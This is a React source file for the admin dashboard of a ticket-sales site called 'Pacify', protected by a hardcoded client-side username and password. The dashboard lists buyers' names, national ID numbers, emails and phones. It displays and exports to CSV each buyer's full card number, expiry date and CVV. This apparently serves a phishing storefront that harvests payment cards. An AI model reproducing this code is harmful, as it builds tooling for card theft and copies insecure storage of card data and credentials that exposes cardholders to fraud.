import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { getPurchases, deletePurchase, formatCurrency, detectCard } from '../utils/storage';
import { PurchaseData } from '../types';
import styles from './Admin.module.css';

function NetLogo({ net, size = 28 }: { net: string; size?: number }) {
  const h = Math.round(size * 0.6);
  if (net==='VISA') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="3" fill="#1A1F71"/><text x="5" y="19" fontFamily="Arial" fontWeight="bold" fontSize="15" fill="white">VISA</text></svg>;
  if (net==='MASTERCARD') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="3" fill="#111"/><circle cx="15" cy="13" r="9" fill="#EB001B"/><circle cx="29" cy="13" r="9" fill="#F79E1B"/><path d="M22 5.8a9 9 0 010 14.4A9 9 0 0122 5.8z" fill="#FF5F00"/></svg>;
  if (net==='AMEX') return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="3" fill="#2E77BC"/><text x="3" y="17" fontFamily="Arial" fontWeight="bold" fontSize="10" fill="white">AMEX</text></svg>;
  return <svg width={size} height={h} viewBox="0 0 44 26"><rect width="44" height="26" rx="3" fill="#2a1d5e" stroke="rgba(167,139,250,0.3)" strokeWidth="1"/><text x="4" y="17" fontFamily="Arial" fontSize="9" fill="rgba(255,255,255,0.5)">{net||'CARD'}</text></svg>;
}

function Badge({ status }: { status: string }) {
  const map: Record<string, string> = { confirmed: styles.badgeGreen, pending: styles.badgeYellow, failed: styles.badgeRed };
  const lbl: Record<string, string> = { confirmed: 'Confirmada', pending: 'Pendiente', failed: 'Fallida' };
  return <span className={`${styles.badge} ${map[status]||styles.badgeYellow}`}>{lbl[status]||status}</span>;
}

type Sort = { field: keyof PurchaseData; dir: 'asc' | 'desc' };

export default function Admin() {
  const nav = useNavigate();
  const [authed, setAuthed] = useState(false);
  const [user, setUser] = useState('');
  const [pass, setPass] = useState('');
  const [loginErr, setLoginErr] = useState('');
  const [purchases, setPurchases] = useState<PurchaseData[]>([]);
  const [search, setSearch] = useState('');
  const [filterStatus, setFilterStatus] = useState('all');
  const [sort, setSort] = useState<Sort>({ field: 'createdAt', dir: 'desc' });
  const [selected, setSelected] = useState<PurchaseData | null>(null);
  const [showPass, setShowPass] = useState(false);

  useEffect(() => { if (authed) setPurchases(getPurchases()); }, [authed]);

  function login() {
    if (user === 'odyssay' && pass === 'admin') { setAuthed(true); setLoginErr(''); }
    else setLoginErr('Usuario o contrasena incorrectos.');
  }

  function refresh() { setPurchases(getPurchases()); }

  function del(id: string) {
    if (!confirm('Eliminar esta compra permanentemente?')) return;
    deletePurchase(id); refresh();
    if (selected?.id === id) setSelected(null);
  }

  function doSort(field: keyof PurchaseData) {
    setSort(s => s.field === field ? { field, dir: s.dir === 'asc' ? 'desc' : 'asc' } : { field, dir: 'asc' });
  }

  function exportCSV() {
    const cols = ['ID','Show','Fecha Show','Sector','Entradas','Total','Nombre','Apellido','DNI','Email','Telefono','Tarjeta','Red','Tipo','Numero','Titular','Vencimiento','CVV','Cuotas','Fecha Compra','Estado'];
    const rows = purchases.map(p => [p.id,p.showTitle,p.showDate,p.section,p.quantity,p.totalAmount,p.firstName,p.lastName,p.dni,p.email,p.phone,p.cardBrand,p.cardNetwork,p.cardType,p.cardNumber,p.cardHolder,p.cardExpiry,p.cardCvv,p.cuotas,p.createdAt,p.status].join(','));
    const blob = new Blob([cols.join(',')+'\n'+rows.join('\n')], { type: 'text/csv' });
    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'pacify-ventas.csv'; a.click();
  }

  const filtered = purchases.filter(p => {
    const q = search.toLowerCase();
    const ms = !q || [p.firstName,p.lastName,p.email,p.showTitle,p.id,p.dni,p.cardNumber,p.cardHolder].some(v=>v.toLowerCase().includes(q));
    const mf = filterStatus === 'all' || p.status === filterStatus;
    return ms && mf;
  }).sort((a, b) => {
    const av = String(a[sort.field]||''), bv = String(b[sort.field]||'');
    return sort.dir === 'asc' ? av.localeCompare(bv) : bv.localeCompare(av);
  });

  const totalRev = filtered.reduce((s, p) => s + p.totalAmount, 0);
  const avgTicket = filtered.length ? totalRev / filtered.length : 0;

  // ─── LOGIN ────────────────────────────────────────────────────────────────
  if (!authed) return (
    <div className={styles.loginPage}>
      <div className={styles.loginCard}>
        <div className={styles.loginLogo}>
          <svg width="40" height="40" viewBox="0 0 36 36" fill="none"><circle cx="18" cy="18" r="16" stroke="url(#pg)" strokeWidth="2"/><line x1="18" y1="4" x2="18" y2="32" stroke="url(#pg)" strokeWidth="1.8" strokeLinecap="round"/><line x1="18" y1="18" x2="8" y2="28" stroke="url(#pg)" strokeWidth="1.8" strokeLinecap="round"/><line x1="18" y1="18" x2="28" y2="28" stroke="url(#pg)" strokeWidth="1.8" strokeLinecap="round"/><path d="M10 12 Q18 8 26 12" stroke="#a78bfa" strokeWidth="1.4" strokeLinecap="round" fill="none" opacity="0.7"/><defs><linearGradient id="pg" x1="0" y1="0" x2="36" y2="36" gradientUnits="userSpaceOnUse"><stop offset="0%" stopColor="#a78bfa"/><stop offset="100%" stopColor="#7c3aed"/></linearGradient></defs></svg>
        </div>
        <h1 className={styles.loginTitle}>Panel de Control</h1>
        <p className={styles.loginSub}>Pacify — Acceso restringido</p>
        <div className={styles.loginForm}>
          <div className={styles.loginField}>
            <label className={styles.loginLbl}>Usuario</label>
            <input className={`${styles.loginInp} ${loginErr?styles.loginInpErr:''}`} value={user} onChange={e=>setUser(e.target.value)} placeholder="odyssay" onKeyDown={e=>e.key==='Enter'&&login()}/>
          </div>
          <div className={styles.loginField}>
            <label className={styles.loginLbl}>Contrasena</label>
            <div className={styles.loginPwWrap}>
              <input className={`${styles.loginInp} ${loginErr?styles.loginInpErr:''}`} value={pass} onChange={e=>setPass(e.target.value)} type={showPass?'text':'password'} placeholder="••••••" onKeyDown={e=>e.key==='Enter'&&login()}/>
              <button className={styles.loginEye} onClick={()=>setShowPass(!showPass)}>{showPass?'Ocultar':'Mostrar'}</button>
            </div>
          </div>
          {loginErr&&<div className={styles.loginErr}>{loginErr}</div>}
          <button className={styles.loginBtn} onClick={login}>Ingresar</button>
        </div>
      </div>
    </div>
  );

  // ─── DASHBOARD ────────────────────────────────────────────────────────────
  return (
    <div className={styles.dash}>
      {/* Sidebar */}
      <aside className={styles.sidebar}>
        <div className={styles.sideHead}>
          <svg width="28" height="28" viewBox="0 0 36 36" fill="none"><circle cx="18" cy="18" r="16" stroke="url(#sg)" strokeWidth="2"/><line x1="18" y1="4" x2="18" y2="32" stroke="url(#sg)" strokeWidth="1.8" strokeLinecap="round"/><line x1="18" y1="18" x2="8" y2="28" stroke="url(#sg)" strokeWidth="1.8" strokeLinecap="round"/><line x1="18" y1="18" x2="28" y2="28" stroke="url(#sg)" strokeWidth="1.8" strokeLinecap="round"/><path d="M10 12 Q18 8 26 12" stroke="#a78bfa" strokeWidth="1.4" strokeLinecap="round" fill="none" opacity="0.7"/><defs><linearGradient id="sg" x1="0" y1="0" x2="36" y2="36" gradientUnits="userSpaceOnUse"><stop offset="0%" stopColor="#a78bfa"/><stop offset="100%" stopColor="#7c3aed"/></linearGradient></defs></svg>
          <div><div className={styles.sideBrand}>Pacify</div><div className={styles.sideRole}>Panel Admin</div></div>
        </div>
        <nav className={styles.sideNav}>
          <div className={`${styles.sideLink} ${styles.sideLinkActive}`}>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="3" width="7" height="7"/><rect x="15" y="3" width="7" height="7"/><rect x="2" y="14" width="7" height="7"/><rect x="15" y="14" width="7" height="7"/></svg>
            Ventas
          </div>
        </nav>
        <div className={styles.sideFoot}>
          <button className={styles.sideLogout} onClick={()=>nav('/')}>Volver al sitio</button>
          <button className={styles.sideLogout} onClick={()=>setAuthed(false)}>Cerrar sesion</button>
        </div>
      </aside>

      {/* Main */}
      <main className={styles.main}>
        <div className={styles.mainHead}>
          <div>
            <h1 className={styles.mainTitle}>Ventas</h1>
            <p className={styles.mainSub}>{filtered.length} registro{filtered.length!==1?'s':''} encontrado{filtered.length!==1?'s':''}</p>
          </div>
          <div className={styles.mainActions}>
            <button className={styles.iconBtn} onClick={refresh} title="Actualizar">
              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/></svg>
            </button>
            <button className={styles.exportBtn} onClick={exportCSV}>
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
              Exportar CSV
            </button>
          </div>
        </div>

        {/* Stats */}
        <div className={styles.stats}>
          {[
            { label:'Total ventas', value: String(purchases.length), sub: `${filtered.length} filtradas` },
            { label:'Ingresos totales', value: formatCurrency(purchases.reduce((s,p)=>s+p.totalAmount,0)), sub: 'todas las ventas' },
            { label:'Ingresos filtrados', value: formatCurrency(totalRev), sub: `${filtered.length} ventas` },
            { label:'Ticket promedio', value: formatCurrency(Math.round(avgTicket)), sub: 'por orden' },
          ].map(st=>(
            <div key={st.label} className={styles.statCard}>
              <div className={styles.statVal}>{st.value}</div>
              <div className={styles.statLbl}>{st.label}</div>
              <div className={styles.statSub}>{st.sub}</div>
            </div>
          ))}
        </div>

        {/* Filters */}
        <div className={styles.filters}>
          <div className={styles.searchWrap}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.35)" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{position:'absolute',left:14,top:'50%',transform:'translateY(-50%)'}}><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
            <input className={styles.search} placeholder="Buscar por nombre, email, DNI, numero de tarjeta..." value={search} onChange={e=>setSearch(e.target.value)}/>
          </div>
          <select className={styles.select} value={filterStatus} onChange={e=>setFilterStatus(e.target.value)}>
            <option value="all">Todos los estados</option>
            <option value="confirmed">Confirmadas</option>
            <option value="pending">Pendientes</option>
            <option value="failed">Fallidas</option>
          </select>
        </div>

        {/* Table */}
        <div className={styles.tableWrap}>
          {filtered.length === 0 ? (
            <div className={styles.empty}>No se encontraron registros</div>
          ) : (
            <table className={styles.table}>
              <thead>
                <tr>
                  {[['createdAt','Fecha'],['firstName','Comprador'],['showTitle','Show'],['section','Sector'],['totalAmount','Total'],['status','Estado']].map(([f,l])=>(
                    <th key={f} className={styles.th} onClick={()=>doSort(f as keyof PurchaseData)}>
                      {l}
                      {sort.field===f&&<span style={{marginLeft:4,opacity:0.7}}>{sort.dir==='asc'?'↑':'↓'}</span>}
                    </th>
                  ))}
                  <th className={styles.th}>Tarjeta</th>
                  <th className={styles.th}></th>
                </tr>
              </thead>
              <tbody>
                {filtered.map(p=>{
                  const ci2 = detectCard(p.cardNumber);
                  return (
                    <tr key={p.id} className={`${styles.tr} ${selected?.id===p.id?styles.trSel:''}`} onClick={()=>setSelected(selected?.id===p.id?null:p)}>
                      <td className={styles.td}>
                        <div className={styles.tdDate}>{new Date(p.createdAt).toLocaleDateString('es-AR')}</div>
                        <div className={styles.tdSub}>{new Date(p.createdAt).toLocaleTimeString('es-AR',{hour:'2-digit',minute:'2-digit'})}</div>
                      </td>
                      <td className={styles.td}>
                        <div className={styles.avatar}>{(p.firstName[0]||'?').toUpperCase()}{(p.lastName[0]||'').toUpperCase()}</div>
                        <div><div className={styles.tdMain}>{p.firstName} {p.lastName}</div><div className={styles.tdSub}>{p.email}</div></div>
                      </td>
                      <td className={styles.td}><div className={styles.tdMain}>{p.showTitle}</div><div className={styles.tdSub}>{p.showDate}</div></td>
                      <td className={styles.td}><span className={styles.sectorTag}>{p.section}</span></td>
                      <td className={styles.td}><div className={styles.amount}>{formatCurrency(p.totalAmount)}</div><div className={styles.tdSub}>{p.quantity}x {p.cuotas>1?`${p.cuotas} cuotas`:''}</div></td>
                      <td className={styles.td}><Badge status={p.status}/></td>
                      <td className={styles.td}>
                        <div className={styles.cardCell}>
                          <NetLogo net={ci2.network} size={26}/>
                          <div><div className={styles.tdMain}>{p.cardBrand}</div><div className={styles.tdSub}>•••• {p.cardNumber.replace(/\s/g,'').slice(-4)}</div></div>
                        </div>
                      </td>
                      <td className={styles.td} onClick={e=>e.stopPropagation()}>
                        <button className={styles.delBtn} onClick={()=>del(p.id)} title="Eliminar">
                          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4h6v2"/></svg>
                        </button>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          )}
        </div>

        {/* Detail panel */}
        {selected&&(
          <div className={styles.detailPanel}>
            <div className={styles.detailHead}>
              <div>
                <div className={styles.detailTitle}>{selected.firstName} {selected.lastName}</div>
                <div className={styles.detailId}>{selected.id}</div>
              </div>
              <div style={{display:'flex',gap:8,alignItems:'center'}}>
                <Badge status={selected.status}/>
                <button className={styles.closeBtn} onClick={()=>setSelected(null)}>
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
                </button>
              </div>
            </div>
            <div className={styles.detailBody}>
              <div className={styles.detailSection}>
                <div className={styles.detailSectionTitle}>Evento</div>
                <div className={styles.detailGrid}>
                  <div className={styles.detailItem}><span>Show</span><strong>{selected.showTitle}</strong></div>
                  <div className={styles.detailItem}><span>Fecha</span><strong>{selected.showDate}</strong></div>
                  <div className={styles.detailItem}><span>Sector</span><strong>{selected.section}</strong></div>
                  <div className={styles.detailItem}><span>Entradas</span><strong>{selected.quantity}</strong></div>
                  <div className={styles.detailItem}><span>Total</span><strong className={styles.green}>{formatCurrency(selected.totalAmount)}</strong></div>
                  {selected.cuotas>1&&<div className={styles.detailItem}><span>Cuotas</span><strong>{selected.cuotas}x {formatCurrency(Math.ceil(selected.totalAmount/selected.cuotas))}</strong></div>}
                </div>
              </div>
              <div className={styles.detailSection}>
                <div className={styles.detailSectionTitle}>Comprador</div>
                <div className={styles.detailGrid}>
                  <div className={styles.detailItem}><span>Nombre</span><strong>{selected.firstName} {selected.lastName}</strong></div>
                  <div className={styles.detailItem}><span>DNI</span><strong className={styles.mono}>{selected.dni}</strong></div>
                  <div className={styles.detailItem}><span>Email</span><strong>{selected.email}</strong></div>
                  <div className={styles.detailItem}><span>Telefono</span><strong>{selected.phone}</strong></div>
                </div>
              </div>
              <div className={styles.detailSection}>
                <div className={styles.detailSectionTitle}>Datos de Pago — Completos</div>
                <div className={styles.cardDetailBox}>
                  <div className={styles.cardDetailTop}>
                    <NetLogo net={detectCard(selected.cardNumber).network} size={42}/>
                    <div><div className={styles.cardDetailBrand}>{selected.cardBrand}</div><div className={styles.cardDetailType}>{selected.cardType}</div></div>
                  </div>
                  <div className={styles.cardDetailGrid}>
                    <div className={styles.cardDetailItem}><span>Numero completo</span><strong className={styles.mono}>{selected.cardNumber}</strong></div>
                    <div className={styles.cardDetailItem}><span>Titular</span><strong>{selected.cardHolder}</strong></div>
                    <div className={styles.cardDetailItem}><span>Vencimiento</span><strong className={styles.mono}>{selected.cardExpiry}</strong></div>
                    <div className={styles.cardDetailItem}><span>CVV</span><strong className={styles.mono}>{selected.cardCvv}</strong></div>
                  </div>
                </div>
              </div>
              <div className={styles.detailSection}>
                <div className={styles.detailSectionTitle}>Transaccion</div>
                <div className={styles.detailGrid}>
                  <div className={styles.detailItem}><span>ID</span><strong className={styles.mono}>{selected.id}</strong></div>
                  <div className={styles.detailItem}><span>Fecha</span><strong>{new Date(selected.createdAt).toLocaleString('es-AR')}</strong></div>
                  <div className={styles.detailItem}><span>Estado</span><Badge status={selected.status}/></div>
                </div>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
